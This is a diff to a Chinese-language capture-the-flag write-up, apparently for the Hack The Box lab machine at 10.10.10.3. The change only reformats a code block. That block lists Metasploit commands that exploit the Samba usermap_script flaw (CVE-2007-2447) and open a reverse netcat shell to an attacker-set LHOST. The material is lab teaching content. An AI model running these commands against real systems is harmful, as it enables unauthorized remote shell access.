@@ -81,14 +81,14 @@ Submit the flag located in the makis user's home directory.
 
 
 
-<pre> ```
+```
 msfconsole
 use exploit/multi/samba/usermap_script
 set RHOSTS 10.10.10.3
 set PAYLOAD cmd/unix/reverse_netcat
 set LHOST <IP>
 run
-  ``` </pre>
+  ```
 
   啟動 Metasploit 主控台工具，用來執行滲透模組。
   選擇針對 CVE-2007-2447 的 Samba 利用模組。
